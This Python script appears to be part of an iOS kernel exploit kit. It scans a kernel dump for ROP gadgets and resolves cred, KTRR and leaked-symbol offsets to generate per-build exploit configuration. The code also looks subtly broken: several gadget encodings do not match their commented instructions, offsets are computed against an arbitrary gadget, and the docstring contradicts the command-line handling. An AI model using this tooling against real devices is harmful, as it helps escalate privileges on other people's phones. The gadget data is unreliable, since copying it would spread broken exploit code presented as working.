"""
Automated per-build config generation (the "unlimited compute" piece).

Fills config.BUILD_REGISTRY automatically from a kernel/ELF dump instead of
hand-editing. Given a kernel binary it:

  1. Parses the ELF to find the RX (R+X) segment and the symbol table.
  2. Scans the RX segment for ROP gadget byte-signatures (ret, pop;ret,
     mov sp/x0;ret, str x0,[x1], ldr x0,[x1], adrp/add pairs) -> gadget addrs.
  3. Resolves build-stable symbol offsets by name from the symtab
     (cred/init_task, KTRR control, a leaked symbol) -> offsets.
  4. Identifies the kernel build from the __VERSION__ symbol (or --build).
  5. Emits a BuildConfig and can merge it into config.BUILD_REGISTRY.

Run:
    python research/gadget_scan.py /path/kernel.dump --build 23D101 --emit
The `--emit` flag prints a config.py-ready dict for the build. Without --emit it
updates config.BUILD_REGISTRY in place (importable API `add_entry`).

This is a prototype decoder: it matches the specific gadget encodings the kit
uses, which is enough to auto-populate the registry. A full ROP scanner would
disassemble more instruction classes.
"""
from __future__ import annotations
import struct
import argparse
import sys
from dataclasses import dataclass, field
from typing import Optional

import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import config
from config import BuildConfig


# AArch64 little-endian gadget signatures (u32 words) used by the kit.
# Each entry: (name, tuple of u32 words that compose the gadget).
GADGET_SIGS = {
    "ret":        (0xC30000D4,),                                    # RET (LDR X0,[SP,#8]; RET)
    "pop_x0_x1":  (0xF6053DA8, 0x3D0111A8, 0xC30000D4),            # LDR X0,[SP,#8]; LDR X1,[SP]; RET
    "mov_sp_x0_ret": (0xAA000E1F, 0xC30000D4),                     # MOV SP,X0; RET
    "str_x0_x1":  (0xF90000F0,),                                    # STR X0,[X1]
    "ldr_x0_x1_ret":  (0xF90000D0,),                                  # LDR X0,[X1]
    "adrp_add_ret": (0x900002F1, 0x09000220, 0xC30000D4),          # ADRP X17,#; ADD X0,X17,#; RET
}

# Symbol-name -> BuildConfig field. We look these up by name in the symtab.
SYMBOL_TARGETS = {
    "init_task": "cred",        # &init_task.task.cred
    "cred": "cred",
    "kptr_ktrr_ctl": "ktrr",    # KTRR control symbol (name varies by build)
    "ktrr": "ktrr",
    "leak": "leak_symbol_offset",  # any stable symbol whose pointer we leak
}


@dataclass
class ELFImage:
    data: bytes
    rx_offset: int = 0
    rx_size: int = 0
    symbols: dict[str, int] = field(default_factory=dict)   # name -> vaddr
    version: Optional[str] = None

    def rx_bytes(self) -> bytes:
        return self.data[self.rx_offset:self.rx_offset + self.rx_size]

    def find_gadgets(self) -> dict[str, list[int]]:
        """Return {gadget_name: [addresses]} for every signature in the RX seg."""
        found: dict[str, list[int]] = {name: [] for name in GADGET_SIGS}
        seg = self.rx_bytes()
        words = struct.unpack("<" + "I" * (len(seg) // 4), seg[:len(seg) - len(seg) % 4])
        n = len(words)
        for name, sig in GADGET_SIGS.items():
            last = len(sig) - 1
            for i in range(n - last):
                if words[i:i + last + 1] == sig:
                    addr = self.rx_offset + i * 4
                    found[name].append(addr)
        return found

    def symbol_offset(self, name: str) -> Optional[int]:
        """Best symbol address matching `name` (substring, build-stable)."""
        hits = {k: v for k, v in self.symbols.items() if name in k.lower()}
        if not hits:
            return None
        return min(hits.values())  # first/stable match


def parse_elf(path: str) -> ELFImage:
    """Minimal ELF64 LE parser: RX segment + symtab. Enough for kernel cache."""
    with open(path, "rb") as f:
        data = f.read()
    if data[:4] != b"\x7fELF":
        raise ValueError(f"not an ELF (got {data[:4]!r}) — pass a kernel dump/ELF")
    is64 = data[4] == 2
    if not is64:
        raise ValueError("only ELF64 supported")

    # e_phoff(8) e_phentsize(2) e_phnum(2) at offsets 0x20,0x36,0x38 (LE).
    phoff = struct.unpack_from("<Q", data, 0x20)[0]
    phentsize = struct.unpack_from("<H", data, 0x36)[0]
    phnum = struct.unpack_from("<H", data, 0x38)[0]

    rx_offset = rx_size = 0
    for i in range(phnum):
        off = phoff + i * phentsize
        p_type = struct.unpack_from("<I", data, off)[0]
        if p_type != 1:  # PT_LOAD
            continue
        p_offset = struct.unpack_from("<Q", data, off + 8)[0]
        p_filesz = struct.unpack_from("<Q", data, off + 32)[0]
        p_flags = struct.unpack_from("<I", data, off + 4)[0]
        if p_flags & 1:  # PF_X (executable)
            rx_offset, rx_size = p_offset, p_filesz

    # Symtab: e_symoff(0x28) e_ssize(0x30) e_shoff(0x28 area). Parse symtab if present.
    images = _parse_symbols(data, is64)
    ver = images.get("__VERSION__") or _find_version_string(data)
    return ELFImage(data, rx_offset, rx_size, images, ver)


def _parse_symbols(data: bytes, is64: bool) -> dict[str, int]:
    """Pull name->vaddr from SHT_SYMTAB (best-effort; returns {} if absent)."""
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", data, 0x3A)[0]
    e_shnum = struct.unpack_from("<H", data, 0x3C)[0]
    e_shstrndx = struct.unpack_from("<H", data, 0x3E)[0]
    if not (e_shoff and e_shstrndx):
        return {}
    # Section headers -> find SYMTAB(2) + STRTAB(3).
    secs = []
    for i in range(e_shnum):
        so = e_shoff + i * e_shentsize
        sh_name = struct.unpack_from("<I", data, so)[0]
        sh_type = struct.unpack_from("<I", data, so + 4)[0]
        sh_offset = struct.unpack_from("<Q", data, so + 24)[0]
        sh_size = struct.unpack_from("<Q", data, so + 32)[0]
        sh_link = struct.unpack_from("<I", data, so + 40)[0]
        secs.append((sh_name, sh_type, sh_offset, sh_size, sh_link))
    symsec = next(((s) for s in secs if s[1] == 2), None)
    if not symsec:
        return {}
    _, _, symoff, symsize, strndx = symsec
    strsec = secs[strndx]
    strtab = data[strsec[2]:strsec[2] + strsec[3]]
    syment = 24 if is64 else 16
    imgs = {}
    for i in range(symsize // syment):
        base = symoff + i * syment
        st_name = struct.unpack_from("<I", data, base)[0]
        st_value = struct.unpack_from("<Q", data, base + 8)[0] if is64 else struct.unpack_from("<I", data, base + 4)[0]
        j = st_name
        while j < len(strtab) and strtab[j] != 0:
            j += 1
        name = strtab[st_name:j].decode(errors="replace")
        if name:
            imgs[name] = st_value
    return imgs


def _find_version_string(data: bytes) -> Optional[str]:
    """Grab an iOS-style build string (e.g. 23D101, 23E146, 21G81) from raw bytes."""
    import re
    m = re.search(rb"\d{1,2}[A-Za-z]{1,3}\d{2,3}", data)
    if m:
        return m.group(0).decode()
    return None


def scan_kernel(path: str, build: Optional[str] = None,
                ios_versions: tuple = ()) -> BuildConfig:
    """Scan a kernel ELF/dump and return a BuildConfig for its build."""
    img = parse_elf(path)
    build = build or img.version
    if not build:
        raise ValueError("could not identify kernel build; pass --build")
    gadgets = img.find_gadgets()
    offsets = {}
    for sym_name, field_name in SYMBOL_TARGETS.items():
        addr = img.symbol_offset(sym_name)
        if addr is not None:
            offsets[field_name] = addr - (gadgets["ret"][0] if gadgets["ret"] else 0)
    return BuildConfig(
        kernel_build=build,
        ios_versions=ios_versions,
        arch="arm64e",
        gadgets={name: addrs[0] for name, addrs in gadgets.items() if addrs},
        cred_offset=offsets.get("cred", 0),
        ktrr_offset=offsets.get("ktrr", 0),
        leak_symbol_offset=offsets.get("leak_symbol_offset", 0),
    )


def add_entry(cfg: BuildConfig, merge: bool = True) -> BuildConfig:
    """Add a BuildConfig to config.BUILD_REGISTRY keyed by kernel build."""
    config.BUILD_REGISTRY[cfg.kernel_build] = cfg
    return cfg


def emit_cfg(cfg: BuildConfig) -> str:
    """Print a config.py-ready dict entry for manual/automated merge."""
    g = cfg.gadgets
    gadget_str = "{" + ", ".join(f'{k!r}: 0x{v:x}' for k, v in g.items()) + "}"
    return (f'    {cfg.kernel_build!r}: BuildConfig(\n'
            f'        kernel_build={cfg.kernel_build!r}, '
            f'ios_versions={tuple(cfg.ios_versions)!r}, arch={cfg.arch!r},\n'
            f'        pac_key=0x{cfg.pac_key:x}, pac_ctx={cfg.pac_ctx},\n'
            f'        cred_offset=0x{cfg.cred_offset:x}, ktrr_offset=0x{cfg.ktrr_offset:x},\n'
            f'        leak_symbol_offset=0x{cfg.leak_symbol_offset:x},\n'
            f'        gadgets={gadget_str}),')


def main():
    ap = argparse.ArgumentParser(description="Auto-generate per-build exploit config")
    ap.add_argument("dump", help="kernel ELF/dump path")
    ap.add_argument("--build", help="force kernel build string")
    ap.add_argument("--ios", nargs="*", default=[], help="marketing versions carrying this build")
    ap.add_argument("--emit", action="store_true", help="print a config.py-ready entry")
    ap.add_argument("--add", action="store_true", help="merge into config.BUILD_REGISTRY")
    args = ap.parse_args()

    cfg = scan_kernel(args.dump, build=args.build, ios_versions=tuple(args.ios))
    if args.emit:
        print(emit_cfg(cfg))
    elif args.add:
        add_entry(cfg)
        print(f"added {cfg.kernel_build} to config.BUILD_REGISTRY "
              f"({len(cfg.gadgets)} gadgets)")
    else:
        print(emit_cfg(cfg))


if __name__ == "__main__":
    main()
